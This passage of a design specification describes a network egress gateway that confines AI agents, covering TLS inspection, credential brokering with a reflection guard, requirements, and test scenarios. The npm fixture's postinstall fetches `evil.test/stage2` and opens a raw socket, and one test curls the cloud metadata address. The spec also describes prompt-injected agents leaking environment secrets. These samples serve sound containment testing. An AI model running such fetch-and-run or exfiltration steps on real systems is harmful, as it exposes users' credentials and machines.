**Reflection guard.** FEP-5 `FW-INV13` requires that a brokered credential never appear "in any
Gateway response". An upstream can echo request headers back: a TRACE handler, an echo or debug
endpoint, an error page that prints the request. For a response to a request on which it presented
a credential, the engine:

1. sends `Accept-Encoding: identity` upstream, and refuses a response whose `Content-Encoding` is
   anything else (`reflection`), because a compressed echo cannot be scanned without decompressing;
2. scans the response headers and the body stream for every wire encoding of the credential it
   presented: the secret itself and the full scheme value (for `basic`, the base64 of
   `user:secret`);
3. holds back only the longest suffix of each forwarded chunk that is a proper prefix of an
   encoding, so no released byte begins a match, and releases held bytes with the next chunk or at
   end of stream;
4. on a match, resets the client connection and emits a `reflection` violation.

In ordinary traffic a chunk's tail rarely matches the first byte of an encoding, so held bytes are
rare. A server-sent-events stream ends every event with `\n\n`, which begins no encoding, so the
guard adds no latency to model streaming (`FW-E2E-093`). The guard applies only to responses to
requests that carried a presented credential; other responses cannot contain it (`FW-CRED17`).

A `401` or `403` from an upstream on a brokered request produces one operator line naming the
credential type and host, since an expired or wrongly scoped credential is otherwise invisible to
the operator; the confined process receives the upstream response unchanged.

### 4.8 Protocol scope

| Traffic | Treatment | Phase (§7.4) |
|---|---|---|
| TLS to a tunnel host, any ALPN (HTTP/2, gRPC) | server-name check, then splice | A |
| Plain HTTP (absolute-form, port 80 rule) | the inspected request pipeline without TLS; reported unencrypted per FEP-5 §4 | A |
| HTTP/1.1 over TLS to an inspected host | terminate, match, broker, forward | B |
| HTTP/2 to an inspected host | not offered in ALPN; clients fall back to HTTP/1.1. A ClientHello whose ALPN list excludes `http/1.1` is refused as `alpn` (`FW-EGR20`), and the operator line suggests `tunnel:` for the host | spike-gated (§11) |
| WebSocket over an inspected host | the upgrade GET is matched and brokered like any request; the engine splices the two sides only after the upstream answers `101` (the `pingora` defect, §2.3); frames pass uninspected, and the report line says so | C |
| An operator's upstream proxy | the engine connects through the proxy named in `formwork run`'s own environment, except for hosts that environment's `NO_PROXY` exempts; the proxy resolves names, so address classification for proxied hosts is `Partial` and the report says so (`FW-EGR26`); the proxy's own address comes from the operator and is not classified (S6) | C |
| HTTP/3 and QUIC | UDP is closed under host rules (FEP-5 `FW-ISO11`); clients fall back to TCP | — |
| Non-HTTP TCP (SSH, database protocols) | refused under host rules; a port-scoped fd ([FW-GW6](../formwork.md#fw-gw6)) is the FEP-1 answer and has no grammar yet (§11) | — |

HTTP/1.1-only ALPN on inspected hosts serves the model APIs and package registries the shipped
examples use, all of which accept HTTP/1.1. gRPC requires HTTP/2 and therefore `tunnel:`.

### 4.9 Limits and timeouts

Each value is defined here once and implemented as a named constant in `formwork-gateway`. The
values are initial; `FW-E2E-093` and `FW-E2E-096` confirm them before Phase B lands.

| Name | Value | Applies to |
|---|---|---|
| **head-limit** | 64 KiB, 100 header fields | a proxy request head and each inner request head |
| **head-timeout** | 10 s | from accept (or from the previous response's end) to a complete head |
| **hello-limit** | 16 KiB | the buffered ClientHello |
| **hello-timeout** | 10 s | from the `200` reply to a complete ClientHello |
| **idle-timeout** | 90 s | an idle keep-alive connection, client side or pooled upstream |
| **body-buffer** | 64 KiB per direction | body bytes held in memory beyond what the peer has read |
| **ca-lifetime** | 400 days | CA validity; the key dies with the process |
| **leaf-lifetime** | 30 days | leaf validity |
| **leaf-cache** | 1,024 hosts | distinct leaves kept; least recently used is dropped |

No limit applies to the duration of a request or a response body in progress: a model stream can
last minutes and pause between events. There is no body-size cap; bodies stream with backpressure.

### 4.10 Records

Every refusal emits one violation record ([FW-FID5](fep-1.md#fw-fid5)) and one operator line (FEP-5
`FW-FID9`). The record carries the capability (`net-host-scope`, `net-inspection` or
`credential-broker`), host, port, method and canonical path when known, the deciding rule and its
layer, a reason, and a timestamp. It never carries header values, bodies or query strings, which
can hold secrets.

The reason is one value from a closed set, a stable JSON string in the Data-model surface
(`FW-FID12`):

| Reason | Stage |
|---|---|
| `host-not-listed`, `host-denied` | host decision |
| `resolution`, `address-class` | destination |
| `not-tls`, `sni-mismatch`, `alpn` | ClientHello |
| `malformed`, `limit` | any parse |
| `host-mismatch`, `method`, `path` | inspected request |
| `placeholder`, `reflection` | brokering |
| `upstream-tls` | upstream certificate verification |

Each admitted tunnel and each admitted inspected request emits a grant record
([FW-FID3](../formwork.md#fw-fid3)) at debug level with host, grade, method, canonical path, status,
byte counts and duration, under the same exclusions (`FW-FID13`). `learn` (FEP-5 `FW-DISC12`)
reverse-compiles `host-not-listed`, `method` and `path` into proposals, and withholds
`address-class` with the itemization FEP-5 describes.

### 4.11 Client reach

The engine serves any client that uses a forward proxy and trusts the CA variables. The Launcher
variable set in FEP-5 §3.1 needs two additions, listed in §9 (c):

- **Lowercase proxy variables.** curl reads `http_proxy` only in lowercase and `HTTPS_PROXY` in
  either case; several libraries read only lowercase. The Launcher sets `http_proxy`,
  `https_proxy`, `HTTP_PROXY` and `HTTPS_PROXY`, and empties both spellings of `no_proxy`.
- **Node.** Node's built-in `fetch` (22.21 and 24.0 onward) and `http`/`https` (22.21 and 24.5
  onward) use the proxy variables only when `NODE_USE_ENV_PROXY=1` is set; the Launcher sets it.
  Older Node, and any client that ignores proxy variables, attempts a direct `connect()`, which the
  supervisor refuses on Linux and Seatbelt refuses on macOS, with an operator line naming the cause.

| Client | Proxy variables | Trust variable | Notes |
|---|---|---|---|
| curl, git (libcurl) | `https_proxy`, `http_proxy` (lowercase) | `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO`, `SSL_CERT_FILE` | git pushes chunked bodies above 1 MiB |
| Python `requests`, `httpx`, `urllib`, pip | either case | `REQUESTS_CA_BUNDLE`, `SSL_CERT_FILE`, `PIP_CERT` | |
| Node `fetch`, `http`, `https`, npm | with `NODE_USE_ENV_PROXY=1` | `NODE_EXTRA_CA_CERTS` | versions above |
| Go `net/http` (`gh`) | either case | `SSL_CERT_FILE` on Linux; ignored on macOS | FEP-5 §3.2 platform-verifier caveat |
| uv | either case | `SSL_CERT_FILE` with `UV_NATIVE_TLS=1` | FEP-5 §3.2 |
| cargo, rustup | **(characterize)** | **(characterize)** | |

A client that ignores the CA variables fails its handshake against an inspected host, and the
operator line suggests `tunnel:` for that host (S1, variant). `FW-E2E-094` turns this table into a
recorded matrix on both CI operating systems.

### 4.12 Asymmetries

The engine is the same program on both platforms. The differences come from the transport (FEP-5
§3.6) and from the host trust store: on Linux `rustls-native-certs` reads the system bundle; on
macOS it reads the keychain's trusted roots. On both it reads `SSL_CERT_FILE` and `SSL_CERT_DIR`
from `formwork run`'s own environment when they are set, and uses only those locations; the
resolved-input disclosure ([FW-FID7](../formwork.md#fw-fid7)) names the source. The Launcher sets
the session's CA variables only in the environment it builds for the child, never in its own, so
the engine cannot load the session bundle as upstream trust (`FW-EGR24`).

---

## 5. Surface changes (each measured against Growth)

**Blueprint, CLI, profiles.** No new field, flag or profile. Two of FEP-5's draft verbs change
(`any:` becomes `allow:`, `https:` becomes `tunnel:`), the default grade becomes inspected, and host
targets must have a recognizable shape (§9 j, `FW-BP16`).

**Report.** No new capability key. The `credential-broker` verdict's reason names the reflection
guard's content-coding condition. Violation records gain the closed `reason` set (§4.10), a
Data-model surface that versions with the record schema.

**Types.** `HostName`, `HostPattern` and `CanonicalPath` in `formwork-blueprint`; `EgressPolicy` in
`formwork-compile`'s `GatewayPolicy` (a `CompiledPolicy` shape change, so a contract change per
[FW-FID4](../formwork.md#fw-fid4)); `EgressError` in `formwork-gateway`, whose variants are API
surface.

**Dependencies.** All in `formwork-gateway`; none in any other crate.

| Crate | Features | Why |
|---|---|---|
| `hyper` 1 | `http1`, `server`, `client` | HTTP/1.1 framing on both sides, and the CONNECT upgrade |
| `hyper-util` 0.1 | `tokio` | `tokio` I/O adapters and the timer behind **head-timeout** |
| `http-body-util` 0.1 | default | body adapters for streaming |
| `rustls` 0.23 (≥ 0.23.45) | `ring`, `std`, `tls12`; no default features | TLS on both sides; `Acceptor` for the ClientHello peek |
| `tokio-rustls` 0.26 | `ring`, `tls12`; no default features | `LazyConfigAcceptor` and async TLS streams |
| `rcgen` 0.14 | `crypto`, `ring`; no default features | the session CA and leaves, in memory |
| `rustls-native-certs` 0.8 | default | the host trust store, for upstream verification and for the session bundle |
| `tokio` (existing) | adds `net` | listeners, sockets and `lookup_host` |

Together they add 34 crates on Linux, among them `ring`, `rustls-webpki`, `http`, `httparse`,
`time` and `zeroize`; on macOS `rustls-native-certs` also brings `security-framework` to read the
keychain. HTTP/2 would add 5 more (`h2`, `slab`, `fnv`, `tokio-util`, `futures-sink`).

**Toolchain.** `rcgen` 0.14.8 and later, and `time` 0.3.47 and later (the RUSTSEC-2026-0009 fix),
need Rust 1.88, so adopting this table would raise the workspace `rust-version` from 1.85 to 1.88.
As built (`docs/fep-6-plan.md` §3) the engine stays on the landed `rcgen` 0.13 and `time` 0.3.44 and
adds no crate, and the MSRV stays 1.85.

---

## 6. Requirements

These continue the EGR, CRED, BP, FID and INV families. One obligation per ID; rationale lives in §4.

| Req | Requirement |
|---|---|
| <a id="fw-egr16"></a>**FW-EGR16** Tunnel server name | For a tunnel-grade host, the Gateway shall forward bytes upstream only after buffering a complete TLS ClientHello whose server name equals the canonical CONNECT host, and shall refuse a connection whose first byte is not a TLS handshake record. |
| <a id="fw-egr17"></a>**FW-EGR17** Single resolution | Before connecting upstream, the Gateway shall resolve the host once, classify every returned address, including any IPv4 address embedded in an IPv6 address, refuse the connection if any address is in a class the matching rule does not admit, and connect only to addresses from that resolution. |
| <a id="fw-egr18"></a>**FW-EGR18** Gateway self-exclusion | The Gateway shall refuse every upstream connection to its own listener endpoints. |
| <a id="fw-egr19"></a>**FW-EGR19** Local and private admission | The Gateway shall admit a loopback, private, shared, link-local or host-interface address other than a metadata address only for a host matched by an exact-name or IP-literal rule. |
| <a id="fw-egr20"></a>**FW-EGR20** Inspected ALPN | For an inspected host, the Gateway shall offer only `http/1.1` in ALPN and shall refuse a ClientHello whose ALPN list is present and excludes `http/1.1`. |
| <a id="fw-egr21"></a>**FW-EGR21** Streamed bodies | The Gateway shall forward request and response bodies as they arrive, holding at most **body-buffer** bytes of a body per direction in memory. |
| <a id="fw-egr22"></a>**FW-EGR22** Authorized forwarding | For an inspected request, the Gateway shall send upstream a request line built from the method and canonical path that matched, with hop-by-hop headers and `Proxy-Authorization` removed. |
| <a id="fw-egr23"></a>**FW-EGR23** Reflective methods | On an inspected host, the Gateway shall refuse TRACE and CONNECT requests under every rule. |
| <a id="fw-egr24"></a>**FW-EGR24** Upstream verification | The Gateway shall verify every upstream TLS certificate for the requested host name against the host trust store it loaded at session start, and shall never trust the session CA or a file a confined process can write for upstream verification. |
| <a id="fw-egr25"></a>**FW-EGR25** Constrained session CA | The session CA certificate shall carry name constraints whose permitted subtrees are exactly the session's inspected exact names, wildcard suffixes and IP literals. |
| <a id="fw-egr26"></a>**FW-EGR26** Upstream proxy | When `formwork run`'s environment names an upstream proxy, the Gateway shall send admitted egress through it, except to hosts that environment's `NO_PROXY` exempts, and shall report destination classification `Partial` with the reason for each proxied host. |
| <a id="fw-cred16"></a>**FW-CRED16** Broker custody | When the blueprint brokers a credential, the Gateway process shall be non-dumpable (Linux) or deny debugger attachment (macOS) from before it spawns the workload until it exits. |
| <a id="fw-cred17"></a>**FW-CRED17** Reflection guard | For a response to a request on which it presented a brokered credential, the Gateway shall request identity content coding, refuse a response with another content coding, and end the response without releasing any byte that begins an occurrence of a wire encoding of the presented credential. |
| <a id="fw-cred18"></a>**FW-CRED18** No credential on OPTIONS | The Gateway shall not present a brokered credential on an OPTIONS request. |
| <a id="fw-cred19"></a>**FW-CRED19** No credential in cleartext | The Gateway shall present a brokered credential only on a request it forwards to the upstream over TLS. |
| <a id="fw-bp16"></a>**FW-BP16** Host target shape | The Blueprint parser shall read a rule target as a path pattern when it begins with `/`, `~`, `$` or `**`, and otherwise as a host target, which it shall accept only if the host contains a dot, is `localhost`, or is an IP literal. |
| <a id="fw-fid12"></a>**FW-FID12** Egress refusal reasons | Every egress violation record shall carry exactly one reason from the closed set in §4.10. |
| <a id="fw-fid13"></a>**FW-FID13** Egress grant records | For each admitted tunnel and inspected request, the Gateway shall emit a grant record with host, grade, method, canonical path, status, byte counts and duration, and no header value, body byte or query string. |

Invariant:

- <a id="fw-inv15"></a>**FW-INV15 — Unparsed is unforwarded.** No byte from a confined process reaches an upstream unless
  the engine parsed it as part of an admitted TLS ClientHello, an admitted request head, or the body
  or tunnel that follows one.

---

## 7. Verification plan

FEP-5 §6.1's rules hold: control run first, positive assertion of each denial, fixtures that are
real subprocesses, and FEP-1's egress harness (loopback fixture upstreams and a controlled resolver,
no external network).

### 7.1 Test inputs the engine needs

- **Resolver fixture.** FEP-1 injects a controlled resolver. The engine takes a resolver as a
  construction argument; the production value calls `getaddrinfo`, and the test harness passes a
  table. Under `FW-EGR19`, an exact-name fixture that resolves to `127.0.0.1` is admitted, which is
  what FEP-1's `FW-E2E-029` needs.
- **Upstream trust.** Fixture upstreams present certificates from a test CA. The harness sets
  `SSL_CERT_FILE` in `formwork run`'s own environment, which the engine honors (§4.12), so no
  test-only switch enters the binary.
- **Fixture upstreams.** Loopback HTTPS servers that record every handshake and request (method,
  path, query, headers) to a log the test reads after the process tree exits. The scenarios use
  `/ok` (a fixed body), `/sse` (one server-sent event every 200 ms), `/reflect` (echoes the request
  headers in the body, into a response header with `?in=header`, compressed with `?gzip=1`), a
  wrapper around `git http-backend`, static package-registry trees, and a CONNECT-proxy fixture that
  records each CONNECT line.
- **`fw-egress-probe`.** A fixture binary beside `fw-mcp-fixture` for traffic ordinary clients do not
  produce: a CONNECT to one host followed by a ClientHello naming another (`tunnel … --sni`), a
  mismatched `Host` inside an inspected tunnel (`inspect … --host`), a non-TLS first byte, an
  `h2`-only ALPN offer, and the raw heads of `FW-ADV-024`.
- **Names.** Each scenario is written with the hosts an operator would use. Its test form replaces
  each with a `.test` name that the resolver fixture maps to a fixture, and replaces a Catalog
  `broker:` entry with an inline binding (FEP-5 `FW-BP12`), because Catalog bindings name production
  hosts.
- **Wildcard success paths.** Under `FW-EGR19` a wildcard-matched host cannot resolve to a local or
  host address, so a loopback fixture cannot serve one. On Linux the harness runs those fixtures in
  a separate network namespace behind a veth pair, at an address outside every refused class that is
  routed nowhere else. On macOS those rows run their refusal half only; the engine code is shared.
- **Assertions.** Refusals are asserted on violation records (reason and host), never on the prose
  of operator lines, whose wording may change (constitution Data model).

### 7.2 Scenarios

Each scenario is a configuration an operator would write, where it fits, how the engine serves it,
and a test form the harness runs as written. The transcripts are illustrative; the expected results
are the contract, and `docs/fep-6-plan.md` §4 maps each test form to where it runs. Several
scenarios overlap FEP-5's `FW-E2E-075`, `077`,
`078`, `084` and `085` and the tests in §7.3; each names the overlap and adds the integrated flow.
Each test form lists steps run inside the session (`formwork run --blueprint <file> -- sh -c ...`)
unless marked "outside", and is checked after the process tree exits.

| # | Scenario | Grade | Brokering | Phase | Test |
|---|---|---|---|---|---|
| S1 | The agent reaches its model API and nothing else | inspected; `tunnel:` variant | none | B | `FW-E2E-098` |
| S2 | The agent never holds its API key | inspected | `broker:anthropic` | B | `FW-E2E-099` |
| S3 | Push and open pull requests in one repository | inspected | `broker:github` | B | `FW-E2E-100` |
| S4 | Dependency installs from public registries | inspected | none | B | `FW-E2E-101` |
| S5 | Read-only documentation research | inspected, wildcard | none | B | `FW-E2E-102` |
| S6 | Corporate network: intranet by name, egress through the corporate proxy | inspected | none | C | `FW-E2E-103` |
| S7 | Exfiltration attempts against S2 | inspected | `broker:anthropic` | B | `FW-ADV-025` |
| S8 | Blueprints the compiler refuses | — | — | A, B | `FW-E2E-104` |
| S9 | Bootstrapping a CI allowlist with `learn` | inspected | none | B | `FW-E2E-105` |
| S10 | A test server inside the session | — | — | blocked on §11 | `FW-E2E-106` |

#### S1. The agent reaches its model API and nothing else

**Configuration.**

```toml
# examples/blueprints/claude-code.toml reduced to the model API, in this FEP's verbs
extends = ["builtin:default"]
rules = [
  "readwrite:$CWD/**",
  "readwrite:~/.claude/**",          # Claude Code's own state
  "allow:api.anthropic.com",         # every request to this host, inspected
]
allow-credentials = ["anthropic", "claude"]   # unchanged: the agent holds its own key
```

**Where it fits.** This replaces `net = { ports = [443] }` in the shipped agent examples. That line
admits every HTTPS host, cloud metadata included, which FEP-1 names as the reason to migrate. With one
host rule the agent keeps its model API and loses everything else. The host is inspected, so the
Gateway also checks each request's `Host` header, which closes domain fronting through the model
host. Claude Code is a Node program and trusts the session CA through `NODE_EXTRA_CA_CERTS`. It is
the starting point for most sessions; `learn` extends it (S9).

**How it works.**

1. The Launcher sets the proxy variables and `NODE_USE_ENV_PROXY=1` (§4.11). The Gateway generates
   the session CA, name-constrained to `api.anthropic.com`, and the Launcher points the CA variables
   at the bundle (§4.6).
2. Claude Code sends `CONNECT api.anthropic.com:443`. The engine parses the authority, finds the
   `allow:` rule, resolves the name, and classifies every address (§4.5).
3. The engine replies `200`, checks the ClientHello's server name, mints the leaf on first use, and
   completes the handshake. Each request's `Host` header and canonical path are checked (§4.4), and
   the request goes upstream over the pooled connection.
4. Any other CONNECT gets `403`, before any certificate is minted for it. A direct `connect()` is
   refused by the supervisor on Linux and by Seatbelt on macOS, and nothing resolves locally (FEP-5
   `FW-EGR12`).

```console
$ formwork run -- sh -c 'curl -sS -o /dev/null -w "%{http_code}\n" https://api.anthropic.com/v1/models
                         curl -sS https://example.com/'
401
curl: (56) CONNECT tunnel failed, response 403
WARN formwork{cmd="run"}: egress refused reason="host-not-listed" host="example.com" port=443 explain="formwork explain https://example.com/"
```

The `401` is Anthropic's answer to a request without a key: the request passed inspection and
reached the host. The `WARN` line is on the operator channel; the agent saw only curl's error.

*Variant: a client that cannot trust the session CA.* `gh`, Go tools and Swift tools on macOS verify
through Security.framework and ignore the CA variables (FEP-5 §3.2). Under `allow:` their handshake
fails with `x509: certificate signed by unknown authority`, and the operator line names the host and
suggests `tunnel:` for it (FEP-5 `FW-FID9`). With `tunnel:api.github.com` in place of an `allow:`
rule, the Gateway forwards that host's connections after the server-name check (§4.3). The host loses
method, path and `Host` checks and brokering, and its verdict is `Partial`.

<a id="fw-e2e-098"></a>**FW-E2E-098: test form (Phase B, both OSes; row 9 alone runs from Phase A).**
`api.anthropic.com` becomes `model.test`; `blocked.test` is a second fixture. `$FIXTURE_CA` is the
test CA's certificate, readable in the session.

| # | Step | Expected |
|---|---|---|
| 0 | outside: `formwork explain --net` | one host, `model.test`, grade inspected, deciding rule `allow:model.test`; the session CA path, constrained to `model.test` |
| 1 | `curl -sS https://model.test/ok` | the fixture's body; the fixture logs one request |
| 2 | `curl -sS https://blocked.test/ok` | curl exit 56, `CONNECT tunnel failed, response 403`; violation `host-not-listed`; `blocked.test` logs nothing |
| 3 | `curl -sS https://169.254.169.254/latest/meta-data/` | curl exit 56; violation `host-not-listed` (the case `ports = [443]` admits) |
| 4 | `curl -sS --noproxy '*' https://<model.test's fixture address>/ok` | curl exit 7; Linux supervisor or macOS Seatbelt refusal record; the fixture logs nothing |
| 5 | `python3 -c 'import socket; socket.getaddrinfo("model.test", 443)'` | `socket.gaierror` |
| 6 | `fw-egress-probe tunnel model.test:443 --sni blocked.test` | violation `sni-mismatch`; neither fixture logs a handshake |
| 7 | `fw-egress-probe inspect model.test:443 --host blocked.test` | `403`; violation `host-mismatch`; `blocked.test` logs nothing |
| 8 | `curl -sS --cacert "$FIXTURE_CA" https://model.test/ok`, standing in for a client that ignores the session CA | curl exit 60; one operator line naming `model.test` and `tunnel:` |
| 9 | row 8 under a blueprint with `tunnel:model.test` in place of `allow:model.test` | the fixture's body; the fixture logs the client's own handshake |

Pass: every row as stated. Fail: any row differs.

#### S2. The agent never holds its API key

**Configuration.**

```toml
extends = ["builtin:default"]
rules = [
  "readwrite:$CWD/**",
  "allow:api.anthropic.com",         # inspected, which brokering requires (FEP-5 FW-CRED12)
]
allow-credentials = ["broker:anthropic"]
```

**Where it fits.** An unattended agent, a CI job, or a script using an Anthropic SDK with
`ANTHROPIC_API_KEY`. The key stays in the Gateway, so a prompt-injected `env`, `printenv` or upload of
the environment reveals a placeholder that works nowhere else. Claude Code brokers `anthropic` only
in its API-key mode; in OAuth mode it lifts `claude` and brokers nothing (FEP-5 §3.2).

**How it works.**

1. At start, the Gateway reads `ANTHROPIC_API_KEY` from `formwork run`'s environment into the vault
   and makes itself non-dumpable before the workload is spawned (`FW-CRED16`).
2. The Launcher strips the variable, runs the scrub, then sets
   `ANTHROPIC_API_KEY=fwcred-anthropic-<nonce>` (FEP-5 `FW-CRED14`).
3. The Gateway generates the session CA, name-constrained to `api.anthropic.com`, writes the bundle
   (host roots plus the CA) to the session scratch, and the Launcher points the CA variables at it.
4. The SDK sends `CONNECT api.anthropic.com:443`. The engine checks the server name, mints the leaf on
   first use, and completes the handshake with ALPN `http/1.1`.
5. `POST /v1/messages` arrives with `x-api-key: fwcred-anthropic-<nonce>`. The method and path match
   `allow:`; the placeholder is bound to this host, so the engine puts the key in `x-api-key`, sets
   `Accept-Encoding: identity`, and forwards over the pooled upstream connection.
6. The server-sent-event response streams back through the reflection guard (§4.7), event by event.

<a id="fw-e2e-099"></a>**FW-E2E-099: test form (Phase B, both OSes; extends FEP-5 `FW-E2E-078`).** `api.anthropic.com`
becomes `model.test`. Catalog bindings name production hosts, so the test uses an inline binding
(FEP-5 `FW-BP12`):
`allow-credentials = [{ name = "model-fixture", env = "FIXTURE_MODEL_KEY", hosts = ["model.test"], scheme = "header:x-api-key" }]`,
with `FIXTURE_MODEL_KEY` set to a random 40-character value in `formwork run`'s environment. A second
fixture, `other.test`, is admitted by `get:other.test/**`.

| # | Step | Expected |
|---|---|---|
| 1 | `printenv FIXTURE_MODEL_KEY` | a `fwcred-` placeholder, not the value the harness set |
| 2 | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" https://model.test/ok` | the fixture's body; the fixture logs `x-api-key` equal to the harness's value |
| 3 | `curl -sS https://model.test/ok` | the fixture logs the harness's value in `x-api-key` (added when absent) |
| 4 | `curl -sS -N -H "x-api-key: $FIXTURE_MODEL_KEY" https://model.test/sse` | 150 events; each reaches curl within 20 ms of the fixture writing it (`FW-E2E-093`) |
| 5 | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" https://other.test/ok` | `403`; violation `placeholder`; `other.test` logs nothing |
| 6 | `curl -sS -X OPTIONS https://model.test/ok` | the fixture logs the request without `x-api-key` (`FW-CRED18`) |
| 7 | after exit: search the session scratch, `$TMPDIR` and the workload's captured output for the harness's value | no match (FEP-5 `FW-INV13`) |

Pass: every row as stated. Fail: any row differs.

#### S3. Push and open pull requests in one repository

**Configuration.**

```toml
extends = ["builtin:default"]
rules = [
  "readwrite:$CWD/**",
  # git smart HTTP for this repository: info/refs (GET), upload-pack and receive-pack (POST)
  "get,post:github.com/acme/widgets.git/**",
  # REST for this repository: read, open and update pull requests, comment
  "get:api.github.com/repos/acme/widgets/**",
  "post:api.github.com/repos/acme/widgets/pulls",
  "patch:api.github.com/repos/acme/widgets/pulls/*",
  "post:api.github.com/repos/acme/widgets/issues/*/comments",
  "deny:api.github.com/repos/acme/widgets/actions/**",   # no workflow runs, logs or artifacts
]
allow-credentials = ["broker:github"]
```

**Where it fits.** An agent that works a ticket end to end: clone, branch, commit, push, open a pull
request, answer review comments. The token never enters the session, and the path rules confine its
use to one repository even when the token itself (a classic personal token, or `gh auth token`)
covers the whole account.

**How it works.**

1. `git clone https://github.com/acme/widgets.git` sends
   `GET /acme/widgets.git/info/refs?service=git-upload-pack` with no `Authorization`. The rule matches
   (the query is not part of the match), and the engine adds `Authorization: Basic` with user
   `x-access-token` and the token, the scheme the Catalog binds to
   `github.com`. Git needs no credential helper.
2. `git push` sends `GET …/info/refs?service=git-receive-pack`, then `POST …/git-receive-pack`,
   whose body is chunked when the pack exceeds `http.postBuffer` (1 MiB by default); the body
   streams (`FW-EGR21`).
3. `POST /repos/acme/widgets/pulls` to `api.github.com` gets `Authorization: Bearer`, the scheme bound
   to that host.
4. A push to `acme/other.git` or a `DELETE /repos/acme/widgets` is refused with `403` (`path`,
   `method`); a request under `/actions/` is refused by the terminal `deny`.

Two limits apply. `gh pr create` uses GraphQL (`POST api.github.com/graphql`), a single endpoint for
every repository; admitting it admits any mutation the token allows, so path rules cannot scope it.
Scope the token itself to the repository (a fine-grained token), or use the REST endpoints above. On
macOS `gh` verifies through Security.framework and refuses the session CA (FEP-5 §3.2); `git` and
`curl` read the CA variables.

<a id="fw-e2e-100"></a>**FW-E2E-100: test form (Phase B, both OSes).** `github.com` becomes `git.test`, a fixture that
wraps `git http-backend` over bare repositories `acme/widgets.git` and `acme/other.git` and accepts
pushes only with the fixture token. `api.github.com` becomes `api.git.test`, a REST fixture. An
inline binding carries one scheme, so the test uses two:
`{ name = "git-fixture", env = "FIXTURE_GIT_TOKEN", hosts = ["git.test"], scheme = "basic" }` and
`{ name = "api-fixture", env = "FIXTURE_API_TOKEN", hosts = ["api.git.test"], scheme = "bearer" }`.

| # | Step | Expected |
|---|---|---|
| 1 | `git clone https://git.test/acme/widgets.git` | succeeds; the fixture logs `Basic` with the fixture token on the first request |
| 2 | commit a 2 MiB random file; `git push origin HEAD:agent/1` | succeeds; `acme/widgets.git` has `agent/1` with the blob; the receive-pack body arrived chunked and byte-identical (`FW-E2E-092`) |
| 3 | `curl -sS -X POST https://api.git.test/repos/acme/widgets/pulls -d '{"head":"agent/1","base":"main","title":"t"}'` | `201` from the fixture; the fixture logs `Bearer` with the API token |
| 4 | `git push https://git.test/acme/other.git HEAD:x` | fails with HTTP 403; violation `path`; `acme/other.git` unchanged |
| 5 | `curl -sS -X DELETE https://api.git.test/repos/acme/widgets` | `403`; violation `method` |
| 6 | `curl -sS https://api.git.test/repos/acme/widgets/actions/runs` | `403`; violation `path`, deciding rule the `deny` line |
| 7 | `git config --get-regexp credential; printenv \| grep FIXTURE_` | no credential helper; placeholders only |

Pass: every row as stated. Fail: any row differs.

#### S4. Dependency installs from public registries

**Configuration.**

```toml
extends = ["builtin:default"]
rules = [
  "readwrite:$CWD/**",
  "readwrite:~/.npm/**",
  "readwrite:~/.cache/pip/**",
  "allow:registry.npmjs.org",
  "allow:pypi.org",
  "allow:files.pythonhosted.org",
]
```

**Where it fits.** `npm ci`, `pip install -r requirements.txt` or `uv sync` in CI, or in an agent's
setup step. Install scripts (`postinstall`, `setup.py`) run confined and reach only the registries,
and the lockfile's integrity hashes verify the contents. A registry whose client rejects the session
CA is marked `tunnel:` instead; the client matrix (`FW-E2E-094`) records which clients do.

The hosts are inspected, so a rule can narrow them by method. `get,head:registry.npmjs.org` refuses a
`PUT` such as `npm publish` from an install script. npm's audit step sends a `POST` under
`/-/npm/v1/security/`, so a method-narrowed blueprint either admits that path
(`post:registry.npmjs.org/-/npm/v1/security/**`) or runs `npm ci --no-audit`.

**How it works.**

1. npm and pip send `CONNECT` for each registry host; the engine inspects each request, as in S1.
2. A `postinstall` script that fetches `https://evil.example/stage2` gets `403`; one that opens a raw
   socket to an address gets `EACCES` from the supervisor (Linux) or a Seatbelt denial (macOS).
3. A dependency fetched from another host (a git dependency on `codeload.github.com`) fails with
   `host-not-listed`; the operator line names the host, and `learn` proposes it (S9).
4. A wildcard rule (`allow:*.example-cdn.net`) admits every subdomain, but never one whose DNS answer
   is a local or private address (§4.5): an attacker who controls a subdomain cannot point it at the
   runner's metadata service or its loopback.

<a id="fw-e2e-101"></a>**FW-E2E-101: test form (Phase B, both OSes; row 3 Linux only, §7.1).** `registry.npmjs.org`
becomes `npm.test`, a static registry fixture serving `fixture-pkg`, whose `postinstall` runs
`curl -sS https://evil.test/stage2 || true; node -e "require('net').connect(443, '198.51.100.7')"`.
`pypi.org` and `files.pythonhosted.org` become `pypi.test` (a static simple index) and
`files.pypi.test`. The blueprint also carries `allow:*.cdn.test`.

| # | Step | Expected |
|---|---|---|
| 1 | `npm install --registry https://npm.test/ fixture-pkg` | succeeds; `node_modules/fixture-pkg` exists; `evil.test` logs nothing; violations `host-not-listed` (`evil.test`) and, on Linux, a supervisor refusal for `198.51.100.7:443` |
| 2 | `pip download --no-deps --index-url https://pypi.test/simple/ fixture-pkg` | the wheel downloads from `files.pypi.test` |
| 3 | `curl -sS https://mirror.cdn.test/ok`, answered with the namespace fixture's address | the fixture's body |
| 4 | `curl -sS https://evil.cdn.test/ok`, answered with `127.0.0.1` | curl exit 56; violation `address-class` |
| 5 | outside: `formwork explain --json` | four hosts inspected; the session CA's name constraints list exactly `npm.test`, `pypi.test`, `files.pypi.test` and the `cdn.test` subtree |
| 6 | under a variant with `get,head:npm.test` in place of `allow:npm.test`: `curl -sS -X PUT -d '{}' https://npm.test/fixture-pkg` | `403`; violation `method`; the fixture logs nothing |

Pass: every row as stated. Fail: any row differs.

#### S5. Read-only documentation research

**Configuration.**

```toml
extends = ["builtin:default"]
rules = [
  "readwrite:$CWD/**",
  "get,head:docs.python.org/**",
  "get,head:developer.mozilla.org/**",
  "get,head:*.readthedocs.io/**",
  "allow:api.anthropic.com",
]
```

**Where it fits.** A research agent, or a documentation MCP server wrapped by `formwork gateway`,
that reads pages. GET-only rules let it read these hosts and nothing else: it cannot POST a form,
upload a file or send a request body carrying repository contents to them.

A GET still carries data in its path and query, to the host's logs. With an exact name that is the
documentation host's operator. A wildcard over a domain where anyone can publish, such as
`*.readthedocs.io`, admits hosts an attacker can register, so a GET to a subdomain the attacker owns
reaches the attacker. The class table blocks private addresses, not attacker-owned content. Prefer
exact names for user-content domains.

**How it works.**

1. The session CA carries name constraints for `docs.python.org`, `developer.mozilla.org` and the
   `readthedocs.io` subtree (`FW-EGR25`).
2. Each request is matched on method; the path is unrestricted (`/**`).
3. A leaf is minted for each subdomain the first time it is used.
